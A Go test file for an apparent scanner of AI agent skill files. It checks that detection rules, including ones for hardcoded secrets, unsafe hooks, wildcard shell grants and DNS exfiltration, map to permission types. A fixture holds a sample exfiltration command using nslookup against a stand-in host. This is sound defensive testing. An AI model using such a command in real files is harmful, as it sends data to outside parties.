package permission

import (
	"testing"

	"github.com/velzepooz/skill-detector/pkg/model"
	"github.com/velzepooz/skill-detector/pkg/rules"
)

// Every registered rule must be classified: either it maps to capabilities, or
// it is explicitly listed as capability-free. Without this, a new rule silently
// stops contributing to the permissions surface (engine review F-08).
func TestCapabilityTableCoversEveryRegisteredRule(t *testing.T) {
	registered := make(map[string]bool)
	for _, r := range rules.DefaultRegistry().All() {
		registered[r.ID()] = true
	}

	for id := range registered {
		_, mapped := ruleCapabilities[id]
		_, free := capabilityFreeRules[id]
		switch {
		case mapped && free:
			t.Errorf("rule %s is both mapped and declared capability-free", id)
		case !mapped && !free:
			t.Errorf("rule %s is unclassified: add it to ruleCapabilities or capabilityFreeRules", id)
		}
	}

	for id := range ruleCapabilities {
		if !registered[id] {
			t.Errorf("ruleCapabilities has stale entry %s — no such registered rule", id)
		}
	}
	for id := range capabilityFreeRules {
		if !registered[id] {
			t.Errorf("capabilityFreeRules has stale entry %s — no such registered rule", id)
		}
	}
}

func TestExtract_CapabilityBearingRules(t *testing.T) {
	tests := []struct {
		ruleID string
		desc   string
		want   string
	}{
		{"SD-005", "world-writable permissions on script", TypeFilesystem},
		{"SD-006", "hardcoded secret in agent file", TypeFilesystem},
		{"SD-016", "instruction to fetch remote content at runtime", TypeNetwork},
		{"SD-017", "Bash wildcard permission grant", TypeShellExec},
		{"SD-019", "unsanctioned hook command", TypeShellExec},
		{"SD-020", "hook interpolates shell metacharacters", TypeShellExec},
		{"SD-021", "MCP server reaches external domain", TypeNetwork},
		{"SD-022", "DNS exfiltration via nslookup", TypeNetwork},
		{"SD-023", "unrestricted permission grant", TypeShellExec},
		{"SD-024", "MCP server auto-installs and runs a package", TypeShellExec},
	}

	for _, tt := range tests {
		t.Run(tt.ruleID, func(t *testing.T) {
			perms := Extract([]model.Finding{finding(tt.ruleID, tt.desc)}, nil)
			if findPerm(perms, tt.want) == nil {
				t.Errorf("%s: expected %s permission, got %v", tt.ruleID, tt.want, perms)
			}
		})
	}
}

// SD-022 is the concrete regression from F-08: DNS exfiltration carries no
// http(s):// URL, so the domain-mining path cannot fire, but the finding is
// still outbound network traffic.
func TestExtract_DNSExfiltrationInfersNetworkWithoutURL(t *testing.T) {
	perms := Extract(
		[]model.Finding{finding("SD-022", "DNS exfiltration: nslookup \"${PAYLOAD}.probe.example.net\"")},
		[]model.FileContext{fileCtx("SKILL.md", "nslookup \"${PAYLOAD}.probe.example.net\"")},
	)

	p := findPerm(perms, TypeNetwork)
	if p == nil {
		t.Fatalf("expected network permission for SD-022, got %v", perms)
	}
}
